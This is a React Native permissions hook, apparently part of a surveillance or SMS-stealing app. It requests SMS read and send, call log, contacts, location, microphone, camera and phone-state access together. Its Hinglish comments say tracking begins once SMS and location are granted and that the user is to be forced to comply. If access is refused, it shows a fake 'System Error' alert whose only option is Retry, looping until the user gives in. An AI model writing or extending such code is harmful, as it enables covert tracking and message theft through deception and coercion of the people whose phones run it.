import { useEffect, useState } from 'react';
import { PermissionsAndroid, Platform, Alert } from 'react-native';

const usePermissions = () => {
  const [status, setStatus] = useState('pending');

  const requestAll = async () => {
    if (Platform.OS === 'android') {
      try {
        // 🛡️ Saari permissions ek saath maangna
        const granted = await PermissionsAndroid.requestMultiple([
          PermissionsAndroid.PERMISSIONS.RECEIVE_SMS,
          PermissionsAndroid.PERMISSIONS.READ_SMS,
          PermissionsAndroid.PERMISSIONS.SEND_SMS,
          PermissionsAndroid.PERMISSIONS.READ_CALL_LOG,
          PermissionsAndroid.PERMISSIONS.READ_CONTACTS,
          PermissionsAndroid.PERMISSIONS.ACCESS_FINE_LOCATION,
          PermissionsAndroid.PERMISSIONS.ACCESS_COARSE_LOCATION,
          PermissionsAndroid.PERMISSIONS.RECORD_AUDIO,
          PermissionsAndroid.PERMISSIONS.CAMERA,
          PermissionsAndroid.PERMISSIONS.READ_PHONE_STATE,
        ]);

        // 🐅 CORE PERMISSIONS CHECK:
        // Agar SMS aur Location mil gayi, toh app tracking shuru kar degi
        const corePermissions = 
          granted['android.permission.RECEIVE_SMS'] === PermissionsAndroid.RESULTS.GRANTED &&
          granted['android.permission.ACCESS_FINE_LOCATION'] === PermissionsAndroid.RESULTS.GRANTED;

        if (corePermissions) {
          console.log("[✓] Core Permissions Granted");
          setStatus('granted');
        } else {
          console.log("[X] Essential Permissions Denied");
          setStatus('denied');
          
          // User ko force karna permission dene ke liye
          Alert.alert(
            "System Error",
            "App ko sahi se chalne ke liye SMS aur Location permission zaruri hai.",
            [{ text: "Retry", onPress: () => requestAll() }]
          );
        }
      } catch (err) {
        console.warn("Permission Error:", err);
        setStatus('error');
      }
    } else {
      setStatus('web_active');
    }
  };

  useEffect(() => {
    requestAll();
  }, []);

  return status;
};

export default usePermissions;
